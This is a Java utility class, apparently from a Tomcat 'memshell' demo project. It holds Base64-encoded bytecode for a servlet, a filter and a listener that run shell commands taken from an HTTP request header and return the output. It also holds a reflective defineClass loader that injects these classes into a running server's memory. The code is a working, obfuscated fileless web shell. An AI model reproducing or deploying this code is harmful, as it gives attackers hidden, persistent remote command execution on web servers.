package com.example.tomcatmemshell.utils;

import java.io.IOException;
import java.util.Base64;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public class DynamicUtils {
    public static String SERVLET_CLASS_STRING = "yv66vgAAADcAbgoAEgBABwBBCAAxCwACAEIKAEMARAoAQwBFCgA2AEYHAEcHAEgKAAkASQoACABKCgAIAEsLADQATAoATQBOCgA2AE8HAFAHAFEHAFIHAFMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAQUxjb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkc2VydmxldC9NZW1zaGVsbFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAQZ2V0U2VydmxldENvbmZpZwEAHygpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzsBAAdzZXJ2aWNlAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAVAcAVQcAVgcAVwcAWAEACkV4Y2VwdGlvbnMHAFkHAFoBAA5nZXRTZXJ2bGV0SW5mbwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABRNZW1zaGVsbFNlcnZsZXQuamF2YQwAFAAVAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAWwBcBwBdDABeAF8MAGAAYQwAYgBjAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMABQAZAwAFABlDABmADwMAGcAaAcAaQwAagBrDABsAG0BAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BAD9jb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkc2VydmxldC9NZW1zaGVsbFNlcnZsZXQBABBqYXZhL2xhbmcvT2JqZWN0AQAVamF2YXgvc2VydmxldC9TZXJ2bGV0AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB3dhaXRGb3IBAAMoKUkAIQARABIAAQATAAAABgABABQAFQABABYAAAAvAAEAAQAAAAUqtwABsQAAAAIAFwAAAAYAAQAAAA8AGAAAAAwAAQAAAAUAGQAaAAAAAQAbABwAAQAWAAAANQAAAAIAAAABsQAAAAIAFwAAAAYAAQAAABEAGAAAABYAAgAAAAEAGQAaAAAAAAABAB0AHgABAAEAHwAgAAEAFgAAACwAAQABAAAAAgGwAAAAAgAXAAAABgABAAAAFAAYAAAADAABAAAAAgAZABoAAAABACEAIgACABYAAAFRAAUACgAAAFwrwAACTi0SA7kABAIAOgQZBMYASrgABRkEtgAGOgUZBbYABzoGuwAIWbsACVkZBrcACrcACzoHGQe2AAxZOgjGABEsuQANAQAZCLYADqf/6hkFtgAPV6cABToJsQABAFAAVgBZABAAAwAXAAAAMgAMAAAAGAAFABkADwAaABQAGwAeABwAJQAdADcAHwBCACAAUAAjAFYAJgBZACQAWwAoABgAAABcAAkAHgA9ACMAJAAFACUANgAlACYABgA3ACQAJwAoAAcAPwAcACkAKgAIAAAAXAAZABoAAAAAAFwAKwAsAAEAAABcAC0ALgACAAUAVwAvADAAAwAPAE0AMQAqAAQAMgAAAEEABP8ANwAIBwARBwAzBwA0BwACBwA1BwA2BwA3BwAIAAD8ABgHADVIBwAQ/wABAAUHABEHADMHADQHAAIHADUAAAA4AAAABgACADkAOgABADsAPAABABYAAAAsAAEAAQAAAAIBsAAAAAIAFwAAAAYAAQAAACsAGAAAAAwAAQAAAAIAGQAaAAAAAQA9ABUAAQAWAAAAKwAAAAEAAAABsQAAAAIAFwAAAAYAAQAAAC8AGAAAAAwAAQAAAAEAGQAaAAAAAQA+AAAAAgA/";

    public static String FILTER_CLASS_STRING = "yv66vgAAADcAcgoAEwBABwBBCAAyCwACAEIKAEMARAoAQwBFCgA4AEYHAEcHAEgKAAkASQoACABKCgAIAEsLADUATAoATQBOCgA4AE8HAFALADYAUQcAUgcAUwcAVAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA/TGNvbS9leGFtcGxlL3RvbWNhdG1lbXNoZWxsL2RlbW9zL3dlYi9hZGRmaWx0ZXIvbWVtc2hlbGxmaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFUHAFYHAFcHAFgHAFkHAFoBAApFeGNlcHRpb25zBwBbBwBcAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABNtZW1zaGVsbGZpbHRlci5qYXZhDAAVABYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DABdAF4HAF8MAGAAYQwAYgBjDABkAGUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAFQBmDAAVAGcMAGgAaQwAagBrBwBsDABtAG4MAG8AcAEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgwAIABxAQA9Y29tL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvZGVtb3Mvd2ViL2FkZGZpbHRlci9tZW1zaGVsbGZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAd3YWl0Rm9yAQADKClJAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhABIAEwABABQAAAAEAAEAFQAWAAEAFwAAAC8AAQABAAAABSq3AAGxAAAAAgAYAAAABgABAAAAEAAZAAAADAABAAAABQAaABsAAAABABwAHQABABcAAAA1AAAAAgAAAAGxAAAAAgAYAAAABgABAAAAEgAZAAAAFgACAAAAAQAaABsAAAAAAAEAHgAfAAEAAQAgACEAAgAXAAABeAAFAAsAAABpK8AAAjoEGQQSA7kABAIAOgUZBcYATbgABRkFtgAGOgYZBrYABzoHuwAIWbsACVkZB7cACrcACzoIGQi2AAxZOgnGABEsuQANAQAZCbYADqf/6hkGtgAPV6cABToKpwALLSssuQARAwCxAAEAUgBYAFsAEAADABgAAAA6AA4AAAAWAAYAFwARABgAFgAZACAAGgAnABsAOQAdAEQAHgBSACEAWAAkAFsAIgBdACUAYAAmAGgAKgAZAAAAZgAKACAAPQAiACMABgAnADYAJAAlAAcAOQAkACYAJwAIAEEAHAAoACkACQAAAGkAGgAbAAAAAABpACoAKwABAAAAaQAsAC0AAgAAAGkALgAvAAMABgBjADAAMQAEABEAWAAyACkABQAzAAAASQAG/wA5AAkHABIHADQHADUHADYHAAIHADcHADgHADkHAAgAAPwAGAcAN0gHABD/AAEABgcAEgcANAcANQcANgcAAgcANwAAAgcAOgAAAAYAAgA7ADwAAQA9ABYAAQAXAAAAKwAAAAEAAAABsQAAAAIAGAAAAAYAAQAAAC0AGQAAAAwAAQAAAAEAGgAbAAAAAQA+AAAAAgA/";

    public static String LISTENER_CLASS_STRING = "yv66vgAAADcAiAoAGwBCCgA6AEMHAEQKABsARQgAMgoARgBHCgA7AEgKADsASQcASggANAsAAwBLCgBMAE0KAEwATgoAPQBPBwBQBwBRCgAQAFIKAA8AUwoADwBUCgAJAFUKAFYAVwoAWABZCgA9AFoHAFsKABgAXAcAXQcAXgcAXwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQBDTGNvbS9leGFtcGxlL3RvbWNhdG1lbXNoZWxsL2RlbW9zL3dlYi9hZGRMaXN0ZW5lci9NZW1zaGVsbExpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVxdWVzdEYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAHcmVxdWVzdAEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAA2NtZAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBAA1TdGFja01hcFRhYmxlBwBgBwBhBwBiBwBjBwBkAQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAFU1lbXNoZWxsTGlzdGVuZXIuamF2YQwAHQAeDABlAGYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DABnAGgHAGkMAGoAawwAbABtDABuAG8BACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0DABwAHEHAHIMAHMAdAwAdQB2DAB3AHgBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAHQB5DAAdAHoMAHsAfAwAfQB+BwB/DACAAIEHAIIMAIMAhAwAhQCGAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAhwAeAQBBY29tL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvZGVtb3Mvd2ViL2FkZExpc3RlbmVyL01lbXNoZWxsTGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAHd2FpdEZvcgEAAygpSQEAD3ByaW50U3RhY2tUcmFjZQAhABoAGwABABwAAAADAAEAHQAeAAEAHwAAAC8AAQABAAAABSq3AAGxAAAAAgAgAAAABgABAAAADwAhAAAADAABAAAABQAiACMAAAABACQAJQABAB8AAAGRAAUACgAAAH0rtgACwAADTSy2AAQSBbYABk4tBLYABy0stgAIwAAJOgQsEgq5AAsCADoFGQXGAEe4AAwZBbYADToGGQa2AA46B7sAD1m7ABBZGQe3ABG3ABI6CBkItgATWToJxgATGQS2ABS2ABUZCbYAFqf/6BkGtgAXV6cACE0stgAZsQABAAAAdAB3ABgAAwAgAAAAQgAQAAAAEgAIABMAEgAUABcAFQAhABgAKwAZADAAGgA6ABsAQQAcAFMAHgBeAB8AbgAhAHQAJQB3ACMAeAAkAHwAJgAhAAAAcAALADoAOgAmACcABgBBADMAKAApAAcAUwAhACoAKwAIAFsAGQAsAC0ACQAIAGwALgAvAAIAEgBiADAAMQADACEAUwAyADMABAArAEkANAAtAAUAeAAEADUANgACAAAAfQAiACMAAAAAAH0ANwA4AAEAOQAAADwABf8AUwAJBwAaBwA6BwADBwA7BwAJBwA8BwA9BwA+BwAPAAD8ABoHADz/AAUAAgcAGgcAOgAAQgcAGAQAAQA/ACUAAQAfAAAANQAAAAIAAAABsQAAAAIAIAAAAAYAAQAAACkAIQAAABYAAgAAAAEAIgAjAAAAAAABADcAOAABAAEAQAAAAAIAQQ==";

    public static String VALVE_CLASS_STRING = "";


    public static Class<?> getClass(String classCode) throws InvocationTargetException, IllegalAccessException {
        ClassLoader   loader        = Thread.currentThread().getContextClassLoader();
        byte[]        bytes         = Base64.getDecoder().decode(classCode);

        Method   method = null;
        Class<?> clz    = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }
}
